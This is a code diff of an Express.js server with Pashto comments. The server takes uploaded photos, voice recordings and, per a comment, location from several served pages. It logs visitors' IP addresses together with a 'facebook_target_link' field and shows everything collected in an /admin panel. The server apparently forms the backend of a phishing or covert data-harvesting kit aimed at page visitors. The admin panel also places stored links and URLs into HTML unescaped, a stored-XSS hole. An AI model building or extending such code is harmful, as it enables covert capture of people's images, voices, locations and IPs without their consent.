@@ -1,4 +1,3 @@
-
 const express = require('express');
 const multer = require('multer');
 const mongoose = require('mongoose');
@@ -35,7 +34,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- پخواني مسیرونه (سکتورونه) ---
+// --- پخواني او نوي مسیرونه (سکتورونه) ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -68,7 +67,6 @@ app.get('/page8', (req, res) => {
     res.sendFile(path.join(__dirname, 'index8.html'));
 });
 
-// --- نوې اضافه شوې پاڼه (/page9) د فیسبوک لینکونو لپاره ---
 app.get('/page9', (req, res) => {
     res.sendFile(path.join(__dirname, 'index9.html'));
 });
@@ -120,7 +118,7 @@ app.post('/page8', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
     handleIncomingData(req, res);
 });
 
-// د نوي /page9 پاڼې پوسټ ریکویسټ (د فیسبوک لینک، عکسونه او غږونه)
+// د /page9 پاڼې پوسټ ریکویسټ (د فیسبوک لینک، عکسونه، غږ او لوکیشن)
 app.post('/page9', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     if (req.body.facebook_target_link) {
         let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
@@ -129,9 +127,8 @@ app.post('/page9', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
 
         const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
         await FbLinkData.create({ time, ip: clientIp, link: req.body.facebook_target_link });
-        return res.send("Facebook Link Saved");
     }
-    handleIncomingData(req, res);
+    return handleIncomingData(req, res);
 });
 
 // عمومي فنکشن د ډېټا د پروسس او ذخیره کولو لپاره
@@ -181,7 +178,7 @@ async function handleIncomingData(req, res) {
     res.status(400).send("Bad Request");
 }
 
-// د اډمین پاڼه (د نویو فیسبوک لینکونو په ګډون)
+// د اډمین پاڼه
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
@@ -218,7 +215,6 @@ app.get('/admin', async (req, res) => {
     let voicesHtml = voices.length ? voices.map(v => `<div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'><audio controls src="${v.url}"></audio></div>`).join('') : "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
     let deleteAllVoicesBtn = voices.length ? `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>` : '';
 
-    // د فیسبوک لینکونو HTML برخه په اډمین پینل کې
     let fbLinksHtml = fbLinks.length ? `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 200px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${fbLinks.map(f => `📅 نېټه: ${f.time}\n🌐 آی‌پي: ${f.ip}\n🔗 لینک: ${f.link}\n-----------------------------------`).join('\n')}</pre>` : '<p>تر اوسه کوم فیسبوک لینک نه دی ثبت شوی.</p>';
     let deleteFbLinksBtn = fbLinks.length ? `<a href="/admin?delete=fb_links" class="delete-btn" onclick="return confirm('ټول فیسبوک لینکونه پاک شي؟')">ټول پاکول</a>` : '';
 
